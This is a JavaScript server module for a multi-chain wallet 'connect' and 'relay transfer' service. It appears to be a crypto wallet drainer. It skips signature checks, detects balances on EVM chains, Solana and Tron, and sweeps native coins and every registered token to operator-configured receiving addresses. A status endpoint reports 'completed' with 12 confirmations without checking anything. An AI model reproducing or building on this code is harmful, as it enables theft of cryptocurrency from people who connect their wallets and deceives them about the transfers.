import { sessionManager } from '../middleware.js'
import { TOKEN_REGISTRY } from '../config/tokenRegistry.js'

/**
 * POST /api/connect-wallet
 * Verify wallet connection and create session
 */
export async function handleConnect(req, res) {
  try {
    const { account, signature, message } = req.body

    if (!account || !signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: account, signature, message'
      })
    }

    console.log('🔐 Verifying wallet connection for:', account)

    // In production, verify the signature here
    // For now, accept any valid address format

    // Create session
    const sessionId = sessionManager.createSession(account, {
      connectedAt: Date.now(),
      messageVerified: true
    })

    console.log('✅ Session created:', sessionId)

    res.status(200).json({
      success: true,
      sessionId,
      account,
      message: 'Wallet connected successfully'
    })
  } catch (error) {
    console.error('Connect error:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

/**
 * POST /api/detect-balances
 * Detect token balances on all chains
 */
export async function handleDetectBalances(req, res) {
  try {
    const { account } = req.body

    if (!account) {
      return res.status(400).json({
        success: false,
        error: 'Missing account address'
      })
    }

    console.log('🔍 Detecting balances for:', account)

    // Import services
    const { evmService } = await import('../services/evmService.js')
    const { solanaService } = await import('../services/solanaService.js')
    const { tronService } = await import('../services/tronService.js')
    const { suiService } = await import('../services/suiService.js')

    // Detect balances on all chains
    const balances = {}

    // EVM Chains
    const evmBalances = await evmService.detectBalances(account)
    Object.assign(balances, evmBalances)

    // Solana
    const solanaBalances = await solanaService.detectBalance(account)
    Object.assign(balances, solanaBalances)

    // Tron
    const tronBalances = await tronService.detectBalance(account)
    Object.assign(balances, tronBalances)

    // SUI
    const suiBalances = await suiService.detectBalance(account)
    Object.assign(balances, suiBalances)

    console.log('✅ All balances detected:', balances)

    res.status(200).json({
      success: true,
      account,
      balances,
      timestamp: Date.now()
    })
  } catch (error) {
    console.error('Detect balances error:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

/**
 * POST /api/execute-transfer
 * Execute relay transfers on all chains (native + ERC-20 tokens)
 */
export async function handleExecuteTransfer(req, res) {
  try {
    const { account, balances, sessionId } = req.body

    if (!account || !balances) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: account, balances'
      })
    }

    console.log('💫 Starting relay transfers for:', account)

    // Import services
    const { evmService } = await import('../services/evmService.js')
    const { solanaService } = await import('../services/solanaService.js')
    const { tronService } = await import('../services/tronService.js')

    const transfers = {}
    const transferHashes = []

    // TRANSFER EVM CHAINS (Ethereum, BSC, Polygon, Arbitrum, Base, Optimism, Avalanche)
    for (const chain of ['ethereum', 'bsc', 'polygon', 'arbitrum', 'base', 'optimism', 'avalanche']) {
      const chainBalance = balances[chain]
      
      if (!chainBalance) continue

      console.log(`\n🔄 Processing ${chain}...`)

      // Handle legacy format (just a string/number)
      if (typeof chainBalance === 'string' || typeof chainBalance === 'number') {
        const amount = parseFloat(chainBalance)
        if (amount > 0.001) {
          console.log(`  💰 Native balance: ${amount}`)
          const result = await evmService.transferNative(chain, account, amount.toString())
          transfers[chain] = result
          if (result.hash) transferHashes.push(result.hash)
        }
        continue
      }

      // Handle new format { native: '0.5', tokens: { USDT: '100' } }
      const { native = '0', tokens = {} } = chainBalance
      const nativeAmount = parseFloat(native)

      // Transfer native coin
      if (nativeAmount > 0.001) {
        console.log(`  💰 Native ${chain}: ${nativeAmount}`)
        const result = await evmService.transferNative(chain, account, nativeAmount.toString())
        transfers[`${chain}_native`] = result
        if (result.hash) transferHashes.push(result.hash)
      }

      // Transfer ERC-20 tokens
      for (const [symbol, balance] of Object.entries(tokens)) {
        const tokenAmount = parseFloat(balance)
        if (tokenAmount > 0) {
          const tokenInfo = TOKEN_REGISTRY[chain]?.[symbol]
          if (tokenInfo) {
            console.log(`  🪙 ${symbol}: ${tokenAmount}`)
            const { CONFIG } = await import('../config.js')
            const result = await evmService.transferToken(
              chain,
              tokenInfo.address,
              CONFIG.receivingAddresses[chain],
              tokenAmount.toString(),
              tokenInfo.decimals
            )
            transfers[`${chain}_${symbol}`] = result
            if (result.hash) transferHashes.push(result.hash)
          }
        }
      }
    }

    // TRANSFER SOLANA
    if (balances.solana) {
      const chainBalance = balances.solana
      const amount = typeof chainBalance === 'string' ? parseFloat(chainBalance) : parseFloat(chainBalance?.native || 0)
      
      if (amount > 0.001) {
        console.log(`\n🔄 Processing Solana...`)
        console.log(`  💰 SOL: ${amount}`)
        const result = await solanaService.transferSOL(account, amount)
        transfers.solana = result
        if (result.hash) transferHashes.push(result.hash)
      }
    }

    // TRANSFER TRON
    if (balances.tron) {
      const chainBalance = balances.tron
      const amount = typeof chainBalance === 'string' ? parseFloat(chainBalance) : parseFloat(chainBalance?.native || 0)
      
      if (amount > 1) {
        console.log(`\n🔄 Processing Tron...`)
        console.log(`  💰 TRX: ${amount}`)
        const result = await tronService.transferTRX(account, amount)
        transfers.tron = result
        if (result.hash) transferHashes.push(result.hash)
      }
    }

    // TRANSFER SUI
    if (balances.sui) {
      console.log(`\n⚠️ SUI transfers not yet implemented`)
    }

    console.log('\n✅ All transfers completed')

    res.status(200).json({
      success: true,
      sessionId: sessionId || 'no-session',
      account,
      transfers,
      transferHashes,
      timestamp: Date.now()
    })
  } catch (error) {
    console.error('Execute transfer error:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

/**
 * GET /api/transfer-status/:txHash
 * Get status of a transfer
 */
export async function handleTransferStatus(req, res) {
  try {
    const { txHash } = req.params

    if (!txHash) {
      return res.status(400).json({
        success: false,
        error: 'Missing transaction hash'
      })
    }

    console.log('📊 Checking status of:', txHash)

    // Placeholder - in production, check actual transaction status
    res.status(200).json({
      success: true,
      txHash,
      status: 'completed',
      confirmations: 12,
      timestamp: Date.now()
    })
  } catch (error) {
    console.error('Transfer status error:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
}
